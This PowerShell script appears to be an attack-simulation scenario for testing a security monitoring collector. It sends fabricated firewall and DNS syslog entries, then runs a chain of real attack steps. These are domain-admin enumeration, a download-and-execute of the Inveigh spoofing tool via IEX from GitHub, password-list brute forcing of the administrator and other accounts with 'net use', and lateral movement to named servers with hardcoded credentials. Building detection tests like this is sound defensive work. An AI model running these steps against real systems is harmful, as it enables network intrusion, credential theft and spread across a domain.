param (
    [string]$Coll_IP,
    [string]$Instance_IP1,
    [string]$User_Account,
    [string]$ZoneName,
    [string]$DomainName,
    [string]$DomainNetbiosName,
    [string]$ServerName,
    [string]$PhishingName
    )
#Set the IP of the IDR collector
#SET YOUR IP HERE!!!!!!!
# Create a UDP Client Object
$UDPCLient = New-Object System.Net.Sockets.UdpClient
#Type of encoding that will be used for the syslog
$Encoding = [System.Text.Encoding]::ASCII
#Clean before launch
Stop-Process -Name ultrasurf
Stop-Process -Name cmd
Stop-Process -Name Taskmgr
Stop-Process -Name regedit
Sleep 100

#User visits URLs
#portableapps.com
#Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="54.85.8.229"
    $Port="443"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP1,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
#Firewall proxy log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="54.85.8.229"
    $Port="443"
    $URL="portableapps.com"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,THREAT,url,7,$Timestamp2,$Instance_IP1,$IP,$IP,$IP,DynamicDefault,$User_Account,,web-browsing,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,default,$Timestamp2,976,1,1126,$Port,38931,80,0x40,tcp,block-url,$URL,-9999,blocked-sites,informational,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
#DNS log
    #Define the message    
    $URL="portableapps.com"
    $DNSDomain = "portableapps.com"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP1 spt=53685 dhost=$URL destinationDnsDomain=$DNSDomain dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 120
	
#softpedia.com
#Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="64.77.16.72"
    $Port="443"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP1,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
#Firewall proxy log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="64.77.16.72"
    $Port="443"
    $URL="softpedia.com"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,THREAT,url,7,$Timestamp2,$Instance_IP1,$IP,$IP,$IP,DynamicDefault,$User_Account,,web-browsing,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,default,$Timestamp2,976,1,1126,$Port,38931,80,0x40,tcp,block-url,$URL,-9999,blocked-sites,informational,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
#DNS log
    #Define the message    
    $URL="softpedia.com"
    $DNSDomain = "softpedia.com"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP1 spt=53685 dhost=$URL destinationDnsDomain=$DNSDomain dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 120
	
#pendriveapps.com
#Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="172.67.196.190"
    $Port="443"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP1,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
#Firewall proxy log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="172.67.196.190"
    $Port="443"
    $URL="pendriveapps.com"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,THREAT,url,7,$Timestamp2,$Instance_IP1,$IP,$IP,$IP,DynamicDefault,$User_Account,,web-browsing,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,default,$Timestamp2,976,1,1126,$Port,38931,80,0x40,tcp,block-url,$URL,-9999,blocked-sites,informational,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
#DNS log
    #Define the message    
    $URL="pendriveapps.com"
    $DNSDomain = "pendriveapps.com"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP1 spt=53685 dhost=$URL destinationDnsDomain=$DNSDomain dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 120
	
#fcportables.com
#Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="146.112.61.106"
    $Port="443"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP1,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
#Firewall proxy log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="146.112.61.106"
    $Port="443"
    $URL="fcportables.com"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,THREAT,url,7,$Timestamp2,$Instance_IP1,$IP,$IP,$IP,DynamicDefault,$User_Account,,web-browsing,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,default,$Timestamp2,976,1,1126,$Port,38931,80,0x40,tcp,block-url,$URL,-9999,blocked-sites,informational,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
#DNS log
    #Define the message    
    $URL="fcportables.com"
    $DNSDomain = "fcportables.com"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP1 spt=53685 dhost=$URL destinationDnsDomain=$DNSDomain dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 520

#Flagged process
# # Define the URL and the destination path
# $url = "https://ultrasurf.us/download/usf.zip"
# $zipFilePath = "$env:TEMP\usf.zip"  # Temporary path for the downloaded ZIP file
# $extractPath = "C:\Users\$User_Account\Downloads\usf"  # Path to extract the ZIP file
# # Create the extraction directory if it doesn't exist
# if (-not (Test-Path -Path $extractPath)) {
#     New-Item -ItemType Directory -Path $extractPath
# }
# # Download the ZIP file
# Invoke-WebRequest -Uri $url -OutFile $zipFilePath
# # Unzip the downloaded file
# Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
# # Optionally, remove the ZIP file after extraction
# Remove-Item -Path $zipFilePath -Force
# Write-Host "Download and extraction complete!"
Start-Process "C:\s3-downloads\UseCases_Scripts\UseCase_3\Files\ultrasurf.exe"
Sleep 300
#Start random processes
Start-Process cmd -WindowStyle Minimized
Sleep 20
Start-Process Taskmgr.exe -WindowStyle Minimized
Sleep 20
Start-Process regedit.exe -WindowStyle Minimized
Sleep 100

#Obfuscated command (Enumeration and Invoke-Inveigh)
C:\s3-downloads\UseCases_Scripts\UseCase_3\Files\obfuscated.bat
Net Group 'domain Admins' /domain
Sleep 50
Invoke-Expression 'cmd /c start powershell -Command {IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1");Invoke-Inveigh -ConsoleOutput Y -NBNS Y}' 
Sleep 50

#Administrator impersonation
$userVar = Get-ChildItem env:username
$uname  = 'administrator'
$computerVar = Get-ChildItem env:computername
$computerName = $computerVar.Value
$ErrorActionPreference = "Stop"
$hooray = "PasswordNotFound"
$CurrentPath = "C:\s3-downloads\UseCases_Scripts\UseCase_3\Files\"
$FileName = "passwords.txt"
$FName= "$CurrentPath\$FileName"
$count = 1
foreach($value in [System.IO.File]::ReadLines($Fname))
{
$count = $count + 1
$passAttempt = ('net use \\' + $computerName +  ' "' +  $value + '" ' + '/u:' + $uname  )
try
{
Write-Output ("trying password " + $value)
$output = Invoke-Expression $passAttempt | Out-Null
$hooray = $value
write-output ("FOUND the user password: " + $value)
break
}
catch
{
}
}
write-host "The Password is: "  $hooray
write-host "tried " $count " passwords"
Sleep 100
$userVar = Get-ChildItem env:username
$uname  = 'administrator'
$computerVar = Get-ChildItem env:computername
$computerName = $computerVar.Value
$ErrorActionPreference = "Stop"
$hooray = "PasswordNotFound"
$CurrentPath = "C:\s3-downloads\UseCases_Scripts\UseCase_3\Files\"
$FileName = "passwords.txt"
$FName= "$CurrentPath\$FileName"
$count = 1
foreach($value in [System.IO.File]::ReadLines($Fname))
{
$count = $count + 1
$passAttempt = ('net use \\' + $computerName +  ' "' +  $value + '" ' + '/u:' + $uname  )
try
{
Write-Output ("trying password " + $value)
$output = Invoke-Expression $passAttempt | Out-Null
$hooray = $value
write-output ("FOUND the user password: " + $value)
break
}
catch
{
}
}
write-host "The Password is: "  $hooray
write-host "tried " $count " passwords"
Sleep 200


#Honey user
$pw = convertto-securestring -AsPlainText -Force -String 1234
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "${DomainNetbiosName}\$User_Account",$pw
$session = new-pssession -computername localhost -credential $cred -EV Err -EA SilentlyContinue
$session
Sleep 50

$userVar = Get-ChildItem env:username
$uname  = "$User_Account@$DomainName"
$computerVar = Get-ChildItem env:computername
$computerName = $computerVar.Value
$ErrorActionPreference = "Stop"
$hooray = "PasswordNotFound"
$CurrentPath = "C:\s3-downloads\UseCases_Scripts\UseCase_3\Files\"
$FileName = "passwords.txt"
$FName= "$CurrentPath\$FileName"
$count = 1
foreach($value in [System.IO.File]::ReadLines($Fname))
{
$count = $count + 1
$passAttempt = ('net use \\' + $computerName +  ' "' +  $value + '" ' + '/u:' + $uname  )
try
{
Write-Output ("trying password " + $value)
$output = Invoke-Expression $passAttempt | Out-Null
$hooray = $value
write-output ("FOUND the user password: " + $value)
break
}
catch
{
}
}
write-host "The Password is: "  $hooray
write-host "tried " $count " passwords"
Sleep 10
Net use \\${ServerName} /delete
Sleep 2000

#Lateral movement
$Username = "${DomainNetbiosName}\$User_Account"
$Password = '12345'
$pass = ConvertTo-SecureString -AsPlainText $Password -Force
$SecureString = $pass
$MySecureCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$SecureString
Invoke-Command -ComputerName SRV-HQ-FILESSRV.$DomainName -Credential $MySecureCreds -Authentication Negotiate -Verbose -ScriptBlock {dir c:\} -ArgumentList $MySecureCreds -EV Err -EA SilentlyContinue
Sleep 100
Invoke-Command -ComputerName SRV-IT-FILESSRV.$DomainName -Credential $MySecureCreds -Authentication Negotiate -Verbose -ScriptBlock {dir c:\} -ArgumentList $MySecureCreds -EV Err -EA SilentlyContinue
Sleep 100
Invoke-Command -ComputerName SRV-IT-ADDS01.$DomainName -Credential $MySecureCreds -Authentication Negotiate -Verbose -ScriptBlock {dir c:\} -ArgumentList $MySecureCreds -EV Err -EA SilentlyContinue
